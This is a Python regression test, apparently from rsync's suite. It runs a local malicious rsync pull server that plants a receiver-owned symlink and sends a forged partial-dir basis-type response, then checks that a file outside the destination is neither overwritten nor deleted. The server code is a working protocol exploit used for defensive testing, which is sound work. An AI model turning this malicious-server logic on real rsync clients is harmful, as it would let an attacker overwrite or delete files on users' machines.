#!/usr/bin/env python3
"""A malicious pull server must not redirect an in-place partial update.

Protocol-30 peers advertise support for updating a partial basis in place.  The
sender controls the response's basis-type byte.  A relative --partial-dir path
contains peer-named components, so treating the entire path as operator-trusted
lets a server-planted, receiver-owned symlink redirect the basis/output open to
an arbitrary client-local file outside the destination.
"""

import hashlib
import os
import socket
import struct
import subprocess
import threading
import time

from rsyncfns import (
    SCRATCHDIR, claim_ports, makepath, require_tcp, rmtree, rsync_argv,
    test_fail,
)
import rsync_proto as rp

PORT = 13153
CF_INPLACE_PARTIAL_DIR = 1 << 6
FNAMECMP_PARTIAL_DIR = 0x81
PAYLOAD = b'MALICIOUS-SERVER-OVERWRITE\n'
ORIGINAL = b'CLIENT-LOCAL-OUTSIDE-VICTIM\n'

require_tcp('the malicious sender needs a real TCP socket; run with --use-tcp')
claim_ports(PORT)

base = SCRATCHDIR / 'malicious-server-partial-basis-symlink-overwrite'
rmtree(base)
dest = base / 'dest'
outside = base / 'outside'
makepath(dest / 'escape', outside)
victim = outside / 'victim'
victim.write_bytes(ORIGINAL)

# This symlink can be left by the same pull server in an earlier transfer.  It
# is owned by the receiver's euid, which is trusted by operator-path resolution
# but must not be trusted for the peer-derived tail of a partial-dir path.
partial_link = dest / 'escape' / '.rsync-partial'
os.symlink(str(outside), partial_link)
if os.lstat(partial_link).st_uid != os.geteuid():
    test_fail('setup did not create a receiver-euid-owned partial-dir symlink')

lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
lsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
lsock.bind(('127.0.0.1', PORT))
lsock.listen(1)
lsock.settimeout(30)
state = {}


def serve():
    try:
        csock, _ = lsock.accept()
        peer = rp.DaemonReceiver(csock)
        peer.handshake(compat_flags=CF_INPLACE_PARTIAL_DIR)
        # The helper intentionally leaves the client argv unread because most
        # malicious-server tests do not need the reverse stream.  Consume its
        # NUL-separated argv here so we can inspect the later multiplexed
        # generator request and prove that the response is solicited.
        nul_run = 0
        while nul_run < 2:
            b = peer._recv_exact(1)
            nul_run = nul_run + 1 if b == b'\0' else 0
        parent = rp.FileEntry(
            'escape', mode=rp.S_IFDIR | 0o755,
            extra_flags=rp.XMIT_TOP_DIR | rp.XMIT_NO_CONTENT_DIR,
            modtime=1700000000,
        )
        entry = rp.FileEntry(
            'escape/victim', mode=rp.S_IFREG | 0o644,
            length=len(PAYLOAD), modtime=1700000000,
        )
        peer.send_data(parent.encode() + entry.encode() + rp.end_of_flist())

        # Wait for the client's generator to request this exact file.  Its
        # strict destination open correctly rejects the symlinked partial basis
        # and requests a new-file transfer.  The bug is that the receiver does
        # not bind the sender's response basis type to that request, so the
        # malicious sender can substitute FNAMECMP_PARTIAL_DIR below.  The
        # exploit therefore uses a solicited transfer index, not an unsolicited
        # transfer record.
        requested = bytearray()
        # The generator's first positive index is encoded relative to -1, so
        # index 1 is the one-byte delta 2.  Spell it directly to avoid changing
        # the peer object's independent outgoing-index state.
        marker = b'\x02' + rp.w_shortint(
            rp.ITEM_TRANSFER | rp.ITEM_IS_NEW)
        peer.sock.settimeout(10)
        try:
            while marker not in requested:
                hdr = peer._recv_exact(4)
                word = struct.unpack('<I', hdr)[0]
                length = word & 0xFFFFFF
                tag = (word >> 24) - rp.MPLEX_BASE
                payload = peer._recv_exact(length)
                if tag == rp.MSG_DATA:
                    requested += payload
                if len(requested) > 1024 * 1024:
                    raise RuntimeError('generator request exceeded 1 MiB')
        except TimeoutError as exc:
            raise RuntimeError(
                f'generator did not request file index 1; data={requested.hex()}'
            ) from exc

        response = bytearray()
        response += peer.w_ndx(1)
        response += rp.w_shortint(
            rp.ITEM_TRANSFER | rp.ITEM_BASIS_TYPE_FOLLOWS)
        response += rp.w_byte(FNAMECMP_PARTIAL_DIR)
        response += rp.w_sum_head(0, 0, 0, 0)
        response += rp.w_int(len(PAYLOAD)) + PAYLOAD
        response += rp.w_int(0)
        response += hashlib.md5(PAYLOAD).digest()
        response += peer.w_ndx(rp.NDX_DONE)
        response += peer.w_ndx(rp.NDX_DONE)
        response += peer.w_ndx(rp.NDX_DONE)
        peer.send_data(response)
        time.sleep(2)
        peer.close()
    except Exception as exc:  # noqa: BLE001
        state['err'] = repr(exc)


thread = threading.Thread(target=serve, daemon=True)
thread.start()
proc = subprocess.run(
    rsync_argv('-R', '--no-implied-dirs', '--partial-dir=.rsync-partial',
               '--no-whole-file',
               f'rsync://127.0.0.1:{PORT}/mod/', str(dest) + '/'),
    stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=20,
)
thread.join(timeout=5)
lsock.close()

output = (proc.stdout or '') + (proc.stderr or '')
if state.get('err'):
    test_fail(f'Python sender failed: {state["err"]}\n{output}')
if not victim.exists():
    test_fail(
        'malicious pull server made partial-basis cleanup follow a '
        'receiver-owned symlink and delete an arbitrary client-local file '
        'outside the destination tree'
    )
after = victim.read_bytes()
if after == PAYLOAD:
    test_fail(
        'malicious pull server made an in-place partial-basis update follow '
        'a receiver-owned symlink and overwrite an arbitrary client-local '
        'file outside the destination tree'
    )
if after != ORIGINAL:
    test_fail(f'outside victim changed unexpectedly: {after!r}\n{output}')

print('malicious-server-partial-basis-symlink-overwrite: outside victim survived')
